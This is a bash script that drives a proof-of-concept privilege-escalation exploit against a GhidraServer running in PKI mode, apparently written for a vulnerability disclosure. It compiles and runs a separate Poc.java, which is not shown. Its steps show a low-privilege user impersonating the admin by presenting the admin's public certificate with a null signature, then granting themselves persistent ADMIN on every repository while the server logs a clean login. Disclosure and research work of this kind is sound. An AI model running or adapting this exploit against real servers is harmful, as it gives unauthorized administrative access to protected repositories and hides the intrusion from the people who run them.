#!/bin/bash
#
# demo.sh — End-to-end demonstration of the GhidraServer PKI privilege
# escalation vulnerability.
#
# Assumes a GhidraServer is already running in PKI mode with:
#   - Two registered users: 'admin' and 'analyst'
#   - A repository (e.g. 'SecretAnalysis') with an admin-only ACL
#   - PKI certificates in $PKI_DIR
#
# Flow:
#   1. Show analyst has ZERO visibility into the repository
#   2. Run the exploit: analyst impersonates admin, grants self persistent ADMIN
#   3. Show analyst now has ADMIN access without any further exploitation
#
# Required:
#   export GHIDRA_HOME=/path/to/ghidra_12.0.4_PUBLIC
#   export PKI_DIR=/path/to/pki        # directory with ca.crt, user.p12, admin.crt
#
# Optional:
#   export HOST=localhost               # default: localhost
#   export PORT=13100                  # default: 13100
#   export PASSWORD=changeit           # default: changeit
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

GHIDRA_HOME="${GHIDRA_HOME:-}"
PKI_DIR="${PKI_DIR:-$SCRIPT_DIR/docker/pki}"
HOST="${HOST:-::1}"
PORT="${PORT:-13100}"
PASSWORD="${PASSWORD:-changeit}"

# Honour JAVA_HOME if set; otherwise rely on PATH.
if [ -n "${JAVA_HOME:-}" ]; then
    export PATH="$JAVA_HOME/bin:$PATH"
fi

# ── Prerequisites ──────────────────────────────────────────────────────────────
if ! command -v java >/dev/null 2>&1 || ! command -v javac >/dev/null 2>&1; then
    echo "[!] java/javac not found."
    echo "    Install a JDK and either add it to PATH or set JAVA_HOME:"
    echo "      export JAVA_HOME=/path/to/jdk"
    exit 1
fi

if [ -z "$GHIDRA_HOME" ]; then
    echo "[!] GHIDRA_HOME is not set."
    echo "    Export it before running:"
    echo "      export GHIDRA_HOME=/path/to/ghidra_12.0.4_PUBLIC"
    exit 1
fi

if [ ! -d "$GHIDRA_HOME/Ghidra" ]; then
    echo "[!] GHIDRA_HOME does not look like a Ghidra installation: $GHIDRA_HOME"
    echo "    Expected to find a 'Ghidra/' subdirectory there."
    exit 1
fi

for f in "$PKI_DIR/ca.crt" "$PKI_DIR/user.p12" "$PKI_DIR/admin.crt"; do
    if [ ! -f "$f" ]; then
        echo "[!] Missing PKI file: $f"
        echo "    Set PKI_DIR to the directory containing ca.crt, user.p12, and admin.crt."
        exit 1
    fi
done

banner() {
    echo
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo " $*"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# ── Build classpath from local Ghidra installation ────────────────────────────
build_cp() {
    local cp="$SCRIPT_DIR"
    for jar in $(find "$GHIDRA_HOME/Ghidra" -name "*.jar" \
        \( -path "*/GhidraServer/*" -o -path "*/FileSystem/*" -o -path "*/DB/*" \
           -o -path "*/Generic/*" -o -path "*/Utility/*" -o -path "*/Docking/*" \
           -o -path "*/Help/*" -o -path "*/Gui/*" \) | sort); do
        cp="$cp:$jar"
    done
    echo "$cp"
}

# ── Compile Poc.java if the class is missing or the source is newer ────────────
compile_poc() {
    if [ ! -f "$SCRIPT_DIR/Poc.class" ] || [ "$SCRIPT_DIR/Poc.java" -nt "$SCRIPT_DIR/Poc.class" ]; then
        echo "[*] Compiling Poc.java..."
        javac -cp "$(build_cp)" -d "$SCRIPT_DIR" "$SCRIPT_DIR/Poc.java"
        echo "[+] Compiled."
    fi
}

# ── Run Poc ───────────────────────────────────────────────────────────────────
run_poc() {
    java \
        -Dghidra.cacerts="$PKI_DIR/cacerts" \
        -cp "$(build_cp)" \
        Poc "$@"
}

compile_poc

# ─────────────────────────────────────────────────────────────────────────────
banner "STEP 1 — Analyst checks access (BEFORE exploit)"
echo
echo "  The analyst authenticates with LEGITIMATE credentials."
echo "  Because they are not in the repository ACL, they see nothing."
echo

run_poc \
    --host     "$HOST" --port "$PORT" \
    --user-key "$PKI_DIR/user.p12" \
    --ca-cert  "$PKI_DIR/ca.crt" \
    --password "$PASSWORD"

echo

# ─────────────────────────────────────────────────────────────────────────────
banner "STEP 2 — Run exploit (null-signature impersonation + ADMIN escalation)"
echo
echo "  The analyst presents admin's PUBLIC certificate with a null signature."
echo "  The server skips verification entirely and authenticates them as admin."
echo "  The exploit then adds the analyst's real account as ADMIN on every repo."
echo

run_poc \
    --host        "$HOST" --port "$PORT" \
    --target-cert "$PKI_DIR/admin.crt" \
    --user-key    "$PKI_DIR/user.p12" \
    --ca-cert     "$PKI_DIR/ca.crt" \
    --password    "$PASSWORD"

# ─────────────────────────────────────────────────────────────────────────────
banner "STEP 3 — Analyst checks access (AFTER exploit)"
echo
echo "  The analyst authenticates normally — no exploit, own certificate."
echo "  The ACL rewrite persists: they now have ADMIN on SecretAnalysis."
echo

run_poc \
    --host     "$HOST" --port "$PORT" \
    --user-key "$PKI_DIR/user.p12" \
    --ca-cert  "$PKI_DIR/ca.crt" \
    --password "$PASSWORD"

echo
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo " DEMO COMPLETE"
echo " The analyst obtained persistent ADMIN access to an admin-only repository"
echo " using only their own certificate and the admin's PUBLIC certificate."
echo " No admin private key. No brute force. The server logged a clean login."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo
